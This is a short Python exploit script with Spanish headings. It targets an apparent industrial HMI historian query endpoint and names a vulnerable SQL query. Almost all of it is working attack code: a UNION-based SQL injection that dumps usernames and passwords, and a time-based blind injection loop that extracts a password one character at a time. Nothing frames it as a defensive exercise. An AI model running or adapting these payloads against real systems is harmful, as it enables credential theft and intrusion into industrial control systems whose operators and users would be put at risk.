# CODIGO VULNERABLE: SELECT * FROM tags WHERE tag_name = '$user_input';

#EXPLOTAR

import requests

def exploit_hmi_sqli():
    target = "http://192.168.1.100/historian/query"

    # SQL injection payload
    # Extract database credentials
    payload = "' UNION SELECT username, password FROM users-- "

    params = {"tag": payload}

    response = requests.get(target, params=params)
    print(response.text)

    # If vulnerable, response contains username/password hashes

# Advanced: Time-based blind SQLi
def blind_sqli(target):
    result = ""
    for i in range(1, 20):  # Extract 20 characters
        for char in range(32, 127):  # ASCII printable
            payload = f"' OR IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),{i},1))={char}, SLEEP(3), 0)-- "

            params = {"tag": payload}

            import time
            start = time.time()
            requests.get(target, params=params, timeout=5)
            elapsed = time.time() - start

            if elapsed >= 3:
                result += chr(char)
                print(f"[+] Found character: {chr(char)} (Position {i})")
                break

    print(f"[+] Extracted password: {result}")
